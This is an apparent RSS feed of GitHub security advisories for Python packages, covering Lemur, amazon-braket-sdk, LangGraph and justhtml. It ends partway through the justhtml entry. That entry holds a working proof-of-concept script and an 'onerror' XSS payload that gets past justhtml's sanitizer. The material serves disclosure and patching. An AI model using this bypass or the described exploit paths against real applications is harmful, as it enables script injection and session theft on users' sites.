<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-06-25T20:36:54.726Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[lemur] Lemur has an authorization bypass in StrictRolePermission / AuthorityCreatorPermission]]></title>
        <id>https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</id>
        <link href="https://github.com/advisories/GHSA-qcqw-jwxc-2hqg"/>
        <updated>2026-06-25T18:48:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>StrictRolePermission</code> and <code>AuthorityCreatorPermission</code> in <code>lemur/auth/permissions.py</code> call <code>flask_principal.Permission.__init__()</code> with zero <code>Need</code>s when their config flags are unset. Both flags defaulted to <code>False</code> in code prior to the fix, so this was the state of any Lemur install that hadn't explicitly opted in.</p>
<p>Flask-Principal's <code>Permission.allows()</code> returns <code>True</code> whenever <code>self.needs</code> is empty. The <code>.can()</code> gate therefore passes for every authenticated identity, including the lowest-privilege role Lemur ships (<code>read-only</code>).</p>
<p>A user holding only <code>read-only</code> can create root Certificate Authorities, create and edit notifications (an SSRF sink), create domain entries, and upload arbitrary certificates. These classes are the sole authorization check on those endpoints.</p>
<h2 id="root-cause">Root Cause</h2>
<pre><code class="language-python"># lemur/auth/permissions.py
class AuthorityCreatorPermission(Permission):
    def __init__(self):
        requires_admin = current_app.config.get("ADMIN_ONLY_AUTHORITY_CREATION", False)
        if requires_admin:
            super().__init__(RoleNeed("admin"))
        else:
            super().__init__()              # empty Need set

class StrictRolePermission(Permission):
    def __init__(self):
        strict_role_enforcement = current_app.config.get("LEMUR_STRICT_ROLE_ENFORCEMENT", False)
        if strict_role_enforcement:
            needs = [RoleNeed("admin"), RoleNeed("operator")]
            super().__init__(*needs)
        else:
            super().__init__()              # empty Need set
</code></pre>
<p><code>flask_principal.Permission.allows()</code> (upstream, v0.4.0):</p>
<pre><code class="language-python">def allows(self, identity):
    if self.needs and not self.needs.intersection(identity.provides):
        return False
    ...
    return True
</code></pre>
<p>When <code>self.needs == set()</code>, the first guard is falsy and is skipped. <code>excludes</code> is also empty, so <code>allows()</code> returns <code>True</code> for any identity. <code>AuthenticatedResource</code> (the parent class for these views) sets <code>method_decorators = [login_required]</code>, which checks authentication only, no role. So the permission <code>.can()</code> is the only authorization layer in front of these endpoints.</p>
<h2 id="affected-endpoints">Affected Endpoints</h2>
<p>Views whose only authorization check is <code>StrictRolePermission().can()</code> or <code>AuthorityCreatorPermission().can()</code>:</p>
<table>
<thead>
<tr>
<th>Method</th>
<th>Path</th>
<th>Source</th>
</tr>
</thead>
<tbody><tr>
<td>POST</td>
<td>/api/1/authorities</td>
<td>lemur/authorities/views.py:231</td>
</tr>
<tr>
<td>POST</td>
<td>/api/1/certificates/upload</td>
<td>lemur/certificates/views.py:651</td>
</tr>
<tr>
<td>POST</td>
<td>/api/1/pending_certificates/&lt;id&gt;/upload</td>
<td>lemur/pending_certificates/views.py:545</td>
</tr>
<tr>
<td>POST</td>
<td>/api/1/notifications</td>
<td>lemur/notifications/views.py:227</td>
</tr>
<tr>
<td>PUT/DEL</td>
<td>/api/1/notifications/&lt;id&gt;</td>
<td>lemur/notifications/views.py:370,384</td>
</tr>
<tr>
<td>POST</td>
<td>/api/1/domains</td>
<td>lemur/domains/views.py:131</td>
</tr>
</tbody></table>
<p><code>POST /api/1/authorities</code> is gated by <code>AuthorityCreatorPermission().can() and StrictRolePermission().can()</code>; both have empty Needs by default. The other rows are gated by <code>StrictRolePermission().can()</code> alone.</p>
<p>Note on scope: <code>PUT /api/1/authorities/&lt;id&gt;</code> also references <code>StrictRolePermission</code>, but its gate is <code>AuthorityPermission(...).can() and StrictRolePermission().can()</code>. <code>AuthorityPermission</code> is constructed with non-empty Needs (<code>RoleNeed("admin")</code> plus authority-scoped needs), so that endpoint is not bypassable by a <code>read-only</code> user and is excluded from this report.</p>
<h2 id="impact">Impact</h2>
<p>A user holding only the <code>read-only</code> role can:</p>
<ol>
<li>Create root Certificate Authorities. CA cert and private key are persisted in Lemur's DB with the attacker as owner. Any internal trust store that pins Lemur-managed roots can now be signed against by the attacker.</li>
<li>Upload arbitrary certificates via <code>/certificates/upload</code>, including attacker-supplied keys with destinations such as AWS push.</li>
<li>Create or modify notifications, which reach an SSRF sink (see related finding F3, Slack notification webhook).</li>
<li>Mark arbitrary domains as <code>sensitive</code>, manipulating Lemur's domain registry and the cert-issuance approval path.</li>
</ol>
<p>Combined with any low-privilege credential leak (phished employee, leaked SSO token) or insider access, this is a pivot from "any authenticated identity" to control of the PKI issuance plane.</p>
<h2 id="remediation">Remediation</h2>
<p>The config flag defaults for <code>ADMIN_ONLY_AUTHORITY_CREATION</code> and <code>LEMUR_STRICT_ROLE_ENFORCEMENT</code> were changed from <code>False</code> to <code>True</code>. Restrictive role enforcement is now active on all default installs without requiring explicit configuration.</p>
<pre><code class="language-python">class AuthorityCreatorPermission(Permission):
    def __init__(self):
        requires_admin = current_app.config.get("ADMIN_ONLY_AUTHORITY_CREATION", True)
        ...

class StrictRolePermission(Permission):
    def __init__(self):
        strict_role_enforcement = current_app.config.get("LEMUR_STRICT_ROLE_ENFORCEMENT", True)
        ...
</code></pre>
<p><strong>Note:</strong> The opt-out branches (empty Needs) remain in the code. Operators who explicitly set <code>ADMIN_ONLY_AUTHORITY_CREATION = False</code> or <code>LEMUR_STRICT_ROLE_ENFORCEMENT = False</code> in their config will reintroduce the bypass. These flags should be left unset or set to <code>True</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Netflix/lemur/security/advisories/GHSA-qcqw-jwxc-2hqg">https://github.com/Netflix/lemur/security/advisories/GHSA-qcqw-jwxc-2hqg</a></li>
<li><a href="https://github.com/advisories/GHSA-qcqw-jwxc-2hqg">https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-25T18:48:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[amazon-braket-sdk] amazon-braket-sdk vulnerable to Insecure Deserialization via pickle.loads()]]></title>
        <id>https://github.com/advisories/GHSA-g697-2xrc-gc46</id>
        <link href="https://github.com/advisories/GHSA-g697-2xrc-gc46"/>
        <updated>2026-06-25T18:34:19.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Summary</strong>
Amazon Braket SDK is an open-source Python library for interacting with the Amazon Braket quantum computing service, including managing hybrid quantum jobs and retrieving job results. An issue exists where, under certain circumstances, a remote authenticated user with S3 write access to a Braket job output bucket can achieve arbitrary code execution by exploiting insecure deserialization in the job results processing component.</p>
<p><strong>Impact</strong>
The SDK's deserialize_values() function reads the dataFormat field directly from the job results JSON file without validation. An actor with write access to the victim's S3 job output bucket can modify the dataFormat field in results.json from PLAINTEXT to pickled_v4 and replace dataDictionary values with base64-encoded executable payloads. When the victim calls job.result(), load_job_result(), or load_job_checkpoint() as part of their normal Braket workflow, the SDK calls pickle.loads() on the actor-controlled data, executing arbitrary code with the victim's permissions.</p>
<p><strong>Impacted versions</strong>: &gt;= v1.10.0 AND &lt; 1.117.0</p>
<p><strong>Patches</strong>
This issue has been addressed in amazon-braket-sdk version 1.117.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.</p>
<p><strong>Workarounds</strong>
If users cannot upgrade immediately:</p>
<ol>
<li>Restrict S3 bucket policies on the Braket job output buckets to enforce least-privilege access, ensuring only trusted principals have s3:PutObject permissions. This limits an an actor's ability to plant an executable payload.</li>
<li>Validate the dataFormat field in job result metadata before calling job.result(). Refuse to process results where the format is pickled_v4 if it did not explicitly configure pickle serialization.</li>
</ol>
<p><strong>References</strong>
If users have any questions or comments about this advisory, amazon-braket-sdk asks that users contact AWS Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/amazon-braket/amazon-braket-sdk-python/security/advisories/GHSA-g697-2xrc-gc46">https://github.com/amazon-braket/amazon-braket-sdk-python/security/advisories/GHSA-g697-2xrc-gc46</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9291">https://nvd.nist.gov/vuln/detail/CVE-2026-9291</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-036-aws">https://aws.amazon.com/security/security-bulletins/2026-036-aws</a></li>
<li><a href="https://github.com/amazon-braket/amazon-braket-sdk-python/releases/tag/v1.117.0">https://github.com/amazon-braket/amazon-braket-sdk-python/releases/tag/v1.117.0</a></li>
<li><a href="https://github.com/advisories/GHSA-g697-2xrc-gc46">https://github.com/advisories/GHSA-g697-2xrc-gc46</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g697-2xrc-gc46</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-25T18:34:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langgraph-sdk] LangGraph SDK has unsafe URL path construction]]></title>
        <id>https://github.com/advisories/GHSA-w39p-vh2g-g8g5</id>
        <link href="https://github.com/advisories/GHSA-w39p-vh2g-g8g5"/>
        <updated>2026-06-25T18:32:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>langgraph-sdk</code> constructs HTTP request paths for resource operations by interpolating caller-supplied identifier values into URL templates. Without sanitization of those values, identifiers that contain characters with special meaning in URL paths could cause the resulting request to address a different resource (and potentially a different resource type) than the SDK method's call site indicates. In deployments where the SDK receives identifier values that originate from untrusted sources, this could result in unintended access, modification, or deletion of resources beyond the calling user's authorization scope.</p>
<p>This issue is most consequential in deployments that:</p>
<ul>
<li>forward end-user-supplied values directly into SDK identifier parameters without first validating them against an expected format (such as a UUID), and</li>
<li>rely on URL-prefix-based authorization at an upstream layer (reverse proxy, edge gateway, WAF), where the authorization decision is made on the SDK call's intended path rather than on the final delivered request path.</li>
</ul>
<p>There have no evidence of this behavior being triggered in the wild. This change is intended to reduce the surface available when caller-supplied identifier values originate from untrusted sources.</p>
<h2 id="affected-users--systems">Affected users / systems</h2>
<p>You may be affected if you:</p>
<ul>
<li>use <code>langgraph-sdk</code> (Python) to address resources by identifier, and</li>
<li>pass identifier values into SDK methods that originate from end-user input, untrusted third-party callers, or any source that does not validate identifier format before the SDK call.</li>
</ul>
<p>Applications that validate identifier values (for example, by parsing them as UUIDs and rejecting anything that does not parse) before passing them to SDK methods are not affected. Validated UUIDs round-trip through the SDK request path unchanged.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Potential <strong>unintended access, modification, or deletion</strong> of resources via SDK methods called for a different resource type, when caller-supplied identifier values are not validated.</li>
<li>In deployments with prefix-based authorization at an upstream layer, the authorization decision and the final delivered request path may diverge.</li>
<li>Confidentiality: disclosure of resource content beyond the authorization scope of the calling user.</li>
<li>Integrity: modification or deletion of resources beyond the authorization scope of the calling user.</li>
</ul>
<h2 id="patches--mitigation">Patches / mitigation</h2>
<p>The SDK now applies path-segment encoding to identifier values before they are interpolated into request URL templates. After this change, identifier values that contain characters with special meaning in URL paths are transmitted as encoded byte sequences and routed to the resource the SDK method's call site indicates.</p>
<h2 id="compatibility">Compatibility</h2>
<p>Identifier values that match the standard UUID format, or any other format that contains only characters safe to transmit unencoded in URL path segments, round-trip through the SDK request path unchanged. Applications that already validate identifier inputs see no behavioral change.</p>
<h2 id="operational-guidance">Operational guidance</h2>
<ul>
<li>Validate identifier values (typically as UUIDs) at the boundary where untrusted input enters the application, before passing them to SDK methods.</li>
<li>For deployments relying on URL-prefix-based authorization upstream of LangGraph, prefer authorization at the LangGraph server layer or on parsed-and-validated request paths rather than on raw URL prefixes.</li>
</ul>
<h2 id="langsmith--hosted-deployments-note">LangSmith / hosted deployments note</h2>
<p>This issue affects the SDK that runs in caller applications. The LangGraph server runtime, including LangSmith-hosted deployments, receives ordinary HTTP requests on documented routes and is not itself affected by this issue. Applications that consume LangSmith-hosted services via <code>langgraph-sdk</code> and pass untrusted identifier values to SDK methods should upgrade.</p>
<p>First reported by: pucagit (CyStack).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langgraph/security/advisories/GHSA-w39p-vh2g-g8g5">https://github.com/langchain-ai/langgraph/security/advisories/GHSA-w39p-vh2g-g8g5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48776">https://nvd.nist.gov/vuln/detail/CVE-2026-48776</a></li>
<li><a href="https://github.com/langchain-ai/langgraph/releases/tag/sdk%3D%3D0.3.15">https://github.com/langchain-ai/langgraph/releases/tag/sdk%3D%3D0.3.15</a></li>
<li><a href="https://github.com/advisories/GHSA-w39p-vh2g-g8g5">https://github.com/advisories/GHSA-w39p-vh2g-g8g5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w39p-vh2g-g8g5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-25T18:32:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langgraph-checkpoint] LangGraph Checkpoint: Unsafe JSON deserialization in checkpoint loading]]></title>
        <id>https://github.com/advisories/GHSA-fjqc-hq36-qh5p</id>
        <link href="https://github.com/advisories/GHSA-fjqc-hq36-qh5p"/>
        <updated>2026-06-25T18:25:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>LangGraph's <code>JsonPlusSerializer</code> can reconstruct Python objects from JSON checkpoint payloads. Under conditions where someone could modify checkpoint bytes at rest in the backing store, the deserialization path could reconstruct objects beyond what the application expects, which could in turn result in code execution at checkpoint load time.</p>
<p>This is a defense-in-depth issue. The affected behavior is reachable only when checkpoint bytes at rest in the backing store can be modified by an unauthorized party. In most deployments that prerequisite already implies a serious incident; the additional concern is turning "checkpoint-store write access" into code execution in the application runtime.</p>
<p>There is no evidence of this behavior being triggered in the wild, and the team is not aware of a practical path to it in existing deployments today. This change is intended to reduce the surface available after a checkpoint-store incident.</p>
<h2 id="affected-users--systems">Affected users / systems</h2>
<p>Users may be affected if they:</p>
<ul>
<li>use a persistent checkpointer (database, remote store, shared filesystem, etc.) with the default <code>JsonPlusSerializer</code>,</li>
<li>load/resume from checkpoints, and</li>
<li>operate in an environment where write access to the checkpoint store could be obtained by an unauthorized party.</li>
</ul>
<p>The default checkpoint serializer in all shipped checkpointer backends (<code>PostgresSaver</code>, <code>SqliteSaver</code>, and their async counterparts) is <code>JsonPlusSerializer</code>, so applications generally do not need to opt in to be in scope.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Potential <strong>arbitrary code execution</strong> or other unsafe side effects during checkpoint deserialization.</li>
<li>Escalation from "write access to the checkpoint store" to "code execution in the LangGraph worker process," which may expose runtime secrets or provide access to other systems the runtime can reach.</li>
</ul>
<h2 id="patches--mitigation">Patches / mitigation</h2>
<p>The JSON deserialization path has been narrowed so that revival is restricted to default-constructor reconstruction using the args/kwargs carried in the payload. The framework's own encoder has not relied on the removed behavior for produced checkpoints since the msgpack migration, so this change does not affect freshly written checkpoints. Legacy payloads that already used the default constructor as their first option continue to revive correctly via that same path.</p>
<h2 id="compatibility">Compatibility</h2>
<p>A narrow legacy-resume regression applies to pre-October-2025 checkpoints of pydantic models where the original payload depended on a no-validation fallback factory to recover from incompatible schema evolution. After this change, such payloads return <code>None</code> from the revival path and fall through to the langchain-core reviver, which surfaces the raw dict rather than reconstructing the model.</p>
<h2 id="operational-guidance">Operational guidance</h2>
<ul>
<li>Treat checkpoint stores as integrity-sensitive. Restrict write access and rotate credentials if unauthorized access is suspected.</li>
<li>Avoid providing custom JSON revival hooks that reconstruct arbitrary types unless checkpoint data is fully trusted.</li>
</ul>
<h2 id="langsmith--hosted-deployments-note">LangSmith / hosted deployments note</h2>
<p>The team is not aware of this issue presenting concern for existing LangSmith-hosted deployments. The described conditions require modification of the checkpoint persistence layer used by the deployment; typical hosted configurations are designed to prevent such access.</p>
<p>First reported by: pucagit (CyStack).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langgraph/security/advisories/GHSA-fjqc-hq36-qh5p">https://github.com/langchain-ai/langgraph/security/advisories/GHSA-fjqc-hq36-qh5p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48775">https://nvd.nist.gov/vuln/detail/CVE-2026-48775</a></li>
<li><a href="https://github.com/advisories/GHSA-fjqc-hq36-qh5p">https://github.com/advisories/GHSA-fjqc-hq36-qh5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fjqc-hq36-qh5p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-25T18:25:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[justhtml] justhtml: to_markdown() code-span blank-line breakout enables XSS]]></title>
        <id>https://github.com/advisories/GHSA-jf6w-2mvx-633j</id>
        <link href="https://github.com/advisories/GHSA-jf6w-2mvx-633j"/>
        <updated>2026-06-25T17:35:53.000Z</updated>
        <content type="html"><![CDATA[<h1 id="justhtml-to_markdown-code-span-blank-line-breakout-enables-xss">justhtml: to_markdown() code-span blank-line breakout enables XSS</h1>
<h3 id="summary">Summary</h3>
<p>In <code>justhtml</code> 0.9.0 through 1.21.0, <code>to_markdown()</code> renders <code>&lt;code&gt;</code> text (and <code>&lt;pre&gt;</code> text inside a link) as an inline Markdown code span whose only protection is backtick-fence length. A blank line (<code>\n\n</code>) in that text terminates the inline span in any compliant Markdown renderer, so attacker-controlled text that survived HTML sanitization is emitted <strong>unescaped</strong> after the blank line and is re-parsed as live raw HTML/Markdown — yielding XSS in the default configuration. Likely <strong>CWE-79 (Cross-site Scripting)</strong> arising from <strong>CWE-116 (Improper Encoding/Escaping of Output)</strong>.</p>
<h3 id="details">Details</h3>
<p><code>to_markdown()</code> is documented as a safety surface. <code>docs/text.md</code> states the guarantee applies "to the HTML produced by rendering that Markdown with a compliant Markdown renderer," and <code>SECURITY.md</code> promises <code>to_markdown()</code> "escapes line-start Markdown markers that could change block structure" and "uses code fences long enough to contain backticks safely."</p>
<p>The inline code-span helper only sizes the backtick fence; it never accounts for block boundaries:</p>
<p><code>src/justhtml/node.py:32-41</code> (tag <code>v1.21.0</code>):</p>
<pre><code class="language-python">def _markdown_code_span(s: str | None) -&gt; str:
    if s is None:
        s = ""
    # Use a backtick fence longer than any run of backticks inside.
    fence = _markdown_backtick_fence(s, minimum=1)
    # CommonMark requires a space if the content starts/ends with backticks.
    needs_space = s.startswith("`") or s.endswith("`")
    if needs_space:
        return f"{fence} {s} {fence}"
    return f"{fence}{s}{fence}"
</code></pre>
<p>The element's text is taken verbatim (<code>strip=False</code>, so embedded newlines are preserved) and routed into that helper:</p>
<p><code>src/justhtml/node.py:1061-1078</code> (tag <code>v1.21.0</code>):</p>
<pre><code class="language-python">            if tag == "pre":
                code = current.to_text(separator="", strip=False)
                if current_in_link:
                    current_builder.raw(_markdown_code_span(code))      # inline path
                else:
                    fence = _markdown_backtick_fence(code, minimum=3)   # block path
                    ...
            if tag == "code" and not current_preserve:
                current_builder.raw(_markdown_code_span(current.to_text(separator="", strip=False)))
</code></pre>
<p>A Markdown <strong>inline code span is an inline construct and cannot span a block boundary</strong>: a blank line ends the paragraph, the opening backticks are left unmatched (literal), and everything after the blank line is parsed as ordinary Markdown — independent of fence length. Because CommonMark passes raw inline HTML through by default, text such as <code>&lt;img src=x onerror=...&gt;</code> becomes a live element.</p>
<p>Reachability with default settings: <code>JustHTML(html)</code> sanitizes by default; <code>&lt;code&gt;</code> and <code>&lt;pre&gt;</code> are in <code>DEFAULT_POLICY.allowed_tags</code>; default sanitization preserves their text and the blank line (whitespace collapsing is opt-in). The payload lives in <strong>text</strong>, not a URL attribute, so URL-scheme sanitization never applies. The tokenizer decodes character references in normal text before DOM insertion, so <code>&amp;lt;img …&amp;gt;</code> enters the DOM as literal <code>&lt;img …&gt;</code> text while passing HTML sanitization.</p>
<p>Two in-repo asymmetries confirm this is an unguarded path rather than intended behavior:</p>
<ul>
<li><strong>Plain text-node content is HTML-escaped</strong> before Markdown escaping, so the same <code>&amp;lt;img …&amp;gt;</code> outside a code span is neutralized to <code>&amp;lt;img …&gt;</code>. Inside a code span it is not escaped — the fence is assumed sufficient.</li>
<li><strong><code>&lt;pre&gt;</code> outside a link uses a block fence</strong> (<code>minimum=3</code>, line 1066), which a  blank line cannot break. The same <code>&lt;pre&gt;</code> <strong>inside a link</strong> (line 1064) and all <code>&lt;code&gt;</code> use the inline span, which a blank line breaks.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Self-contained, runs entirely in Docker against the pinned PyPI release. Static by default: the rendered HTML is <strong>parsed</strong> to show a live handler-bearing element materializes; no JavaScript is executed on the default path.</p>
<p><code>Dockerfile</code>:</p>
<pre><code class="language-dockerfile">FROM python:3.11-slim
WORKDIR /poc
RUN pip install --no-cache-dir justhtml==1.21.0 markdown-it-py==4.2.0 \
 &amp;&amp; (pip install --no-cache-dir dukpy==0.5.0 || echo "dukpy optional: skipped")
COPY poc.py test.sh /poc/
CMD ["sh", "/poc/test.sh"]
</code></pre>
<p><code>poc.py</code>:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""PoC: justhtml to_markdown() inline code-span blank-line breakout -&gt; XSS.
Audited release: justhtml==1.21.0. Static by default (parses the rendered HTML;
no JS executed). --prove-exec is an opt-in, container-only execution check."""
from __future__ import annotations
import argparse
from html.parser import HTMLParser
from justhtml import JustHTML
from markdown_it import MarkdownIt

MARKER = "__POC_XSS_MARKER__"
PAYLOAD_TEXT = f"&lt;img src=x onerror={MARKER}()&gt;"
RENDER = MarkdownIt("commonmark")  # raw-HTML passthrough is the CommonMark default


def build_inputs() -&gt; tuple[str, str]:
    enc = PAYLOAD_TEXT.replace("&lt;", "&amp;lt;").replace("&gt;", "&amp;gt;")
    control = f"&lt;code&gt;q{enc}&lt;/code&gt;"          # no blank line -&gt; should stay inert
    exploit = f"&lt;code&gt;q\n\n{enc}&lt;/code&gt;"      # + one blank line -&gt; the whole exploit
    return control, exploit


def to_markdown(html: str) -&gt; str:
    return JustHTML(html, fragment=True).to_markdown()  # public API, default sanitize=True


class _SinkFinder(HTMLParser):
    def __init__(self) -&gt; None:
        super().__init__(); self.sinks: list[tuple[str, str, str]] = []
    def handle_starttag(self, tag, attrs):
        for name, val in attrs:
            if name.startswith("on") and val and MARKER in val:
                self.sinks.append((tag, name, val))


def live_sinks(html: str):
    f = _SinkFinder(); f.feed(html); return f.sinks


def show(label: str, html: str):
    md = to_markdown(html); rendered = RENDER.render(md); sinks = live_sinks(rendered)
    print(f"== {label} ==")
    print(f"  1. input HTML        : {html!r}")
    print(f"  2. to_markdown() out : {md!r}")
    print(f"  3. CommonMark render : {rendered.strip()!r}")
    print(f"  4. live JS sinks     : {sinks if sinks else 'NONE (inert)'}\n")
    return rendered, sinks


def prove_exec(rendered: str) -&gt; None:
    print("== --prove-exec (supplementary, container-only) ==")
    sinks = live_sinks(rendered)
    if not sinks:
        print("  no sink to execute"); return
    handler_js = sinks[0][2]
    print(f"  materialized handler JS: {handler_js!r}")
    try:
        import dukpy
    except Exception:
        print("  [skipped] optional 'dukpy' not installed; parse proof is canonical."); return
    result = dukpy.evaljs(f"var fired=''; function {MARKER}(){{ fired='XSS-EXECUTED'; }} {handler_js}; fired;")
    print(f"  JS engine result: {result!r}  -&gt; attacker JS executed" if result else "  JS did not fire")


def main() -&gt; int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--prove-exec", action="store_true")
    args = ap.parse_args()
    control, exploit = build_inputs()
    print("Delta between control and exploit: exactly one blank line (\\n\\n).\n")
    _, c_sinks = show("CONTROL  (payload in &lt;code&gt;, NO blank line)", control)
    ex_rendered, e_sinks = show("EXPLOIT  (payload in &lt;code&gt;, + blank line)", exploit)
    ok = (not c_sinks) and bool(e_sinks)
    print("== VERDICT ==")
    print("  BYPASS CONFIRMED." if ok else "  not reproduced")
    if ok:
        print(f"  Sanitized code text became a LIVE element: {e_sinks[0]}")
    print()
    if ok and args.prove_exec:
        prove_exec(ex_rendered)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
</code></pre>
<p>Build and run:</p>
<pre><code class="language-bash">docker build -t justhtml-md-poc ./poc
docker run --rm justhtml-md-poc
</code></pre>
<p>Observed output (<code>justhtml 1.21.0</code>, <code>markdown-it-py 4.2.0</code>):</p>
<pre><code>=== Versions under test ===
Name: justhtml
Version: 1.21.0
Name: markdown-it-py
Version: 4.2.0

Delta between control and exploit: exactly one blank line (\n\n)
inserted into otherwise identical &lt;code&gt; text.

== CONTROL  (payload in &lt;code&gt;, NO blank line) ==
  1. input HTML        : '&lt;code&gt;q&amp;lt;img src=x onerror=__POC_XSS_MARKER__()&amp;gt;&lt;/code&gt;'
  2. to_markdown() out : '`q&lt;img src=x onerror=__POC_XSS_MARKER__()&gt;`'
  3. CommonMark render : '&lt;p&gt;&lt;code&gt;q&amp;lt;img src=x onerror=__POC_XSS_MARKER__()&amp;gt;&lt;/code&gt;&lt;/p&gt;'
  4. live JS sinks     : NONE (inert)

== EXPLOIT  (payload in &lt;code&gt;, + blank line) ==
  1. input HTML        : '&lt;code&gt;q\n\n&amp;lt;img src=x onerror=__POC_XSS_MARKER__()&amp;gt;&lt;/code&gt;'
  2. to_markdown() out : '`q\n\n&lt;img src=x onerror=__POC_XSS_MARKER__()&gt;`'
  3. CommonMark render : '&lt;p&gt;`q&lt;/p&gt;\n&lt;p&gt;&lt;img src=x onerror=__POC_XSS_MARKER__()&gt;`&lt;/p&gt;'
  4. live JS sinks     : [('img', 'onerror', '__POC_XSS_MARKER__()')]

== VERDICT ==
  BYPASS CONFIRMED.
  The blank line terminated the inline code span; sanitized code
  text became a LIVE handler-bearing element: ('img', 'onerror', '__POC_XSS_MARKER__()')
  The control (no blank line) stayed inert inside &lt;code&gt;.
</code></pre>
<p>The exploit is byte-identical to the inert control plus a single blank line
(<code>\n\n</code>). Deterministic: same input → same result.</p>
<p>Optional execution confirmation (<code>docker run --rm justhtml-md-poc python3 /poc/poc.py --prove-exec</code>)
— supplementary; the parse proof above is canonical. Inert marker only:</p>
<pre><code>== --prove-exec (supplementary, container-only) ==
  materialized handler JS: '__POC_XSS_MARKER__()'
  JS engine result: 'XSS-EXECUTED'  -&gt; attacker JS executed
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a cross-site scripting vulnerability (CWE-79). It affects any application that follows the documented pipeline: sanitize untrusted HTML with <code>JustHTML(...)</code> under default settings, call <code>to_markdown()</code>, and render the result with a CommonMark-compliant renderer (raw-HTML passthrough is the CommonMark default).</p>
<p>An attacker only needs to control HTML text inside a <code>&lt;code&gt;</code> element, or a <code>&lt;pre&gt;</code> element within a link — no custom policy and no <code>sanitize=False</code>. Any user who then views the rendered page executes attacker-controlled script in their own origin, enabling cookie/session theft or actions performed as the victim.</p>
<p>Severity: CVSS 3.1 <strong>6.1 (Moderate)</strong>,
<code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code>. Scope is Changed: the injected script runs in the origin of the page that renders the Markdown, a different security authority than the library that produced it.</p>
<h3 id="recommended-fix">Recommended fix</h3>
<p>Do not represent text containing a block boundary as an inline code span. In <code>_markdown_code_span</code> / the <code>&lt;code&gt;</code> and in-link <code>&lt;pre&gt;</code> dispatch (<code>src/justhtml/node.py:1061-1078</code>), if the content contains a blank line (or any <code>\n</code>), emit it as a fenced code <strong>block</strong> — reusing the existing block path at lines 1066-1074, whose fence is not broken by blank lines — or collapse newlines in inline-code content. As defense-in-depth, escape HTML/Markdown-significant characters in code-span bodies rather than relying on fence length alone, matching the existing text-node escaping already applied elsewhere.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>CWE-79 — <a href="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</a></li>
<li>CWE-116 — <a href="https://cwe.mitre.org/data/definitions/116.html">https://cwe.mitre.org/data/definitions/116.html</a></li>
<li>Affected source (tag <code>v1.21.0</code>): <code>src/justhtml/node.py:32-41</code> (<code>_markdown_code_span</code>),  <code>src/justhtml/node.py:1061-1078</code> (<code>&lt;pre&gt;</code>/<code>&lt;code&gt;</code> dispatch).</li>
<li>CommonMark spec — code spans are inline and cannot contain a blank line; raw HTML is passed through by default: <a href="https://spec.commonmark.org/0.31.2/#code-spans">https://spec.commonmark.org/0.31.2/#code-spans</a></li>
<li>Novelty: same vulnerability class as two prior, already-fixed <code>to_markdown()</code> advisories but a <strong>distinct, still-unfixed variant</strong>. The earlier fixes address
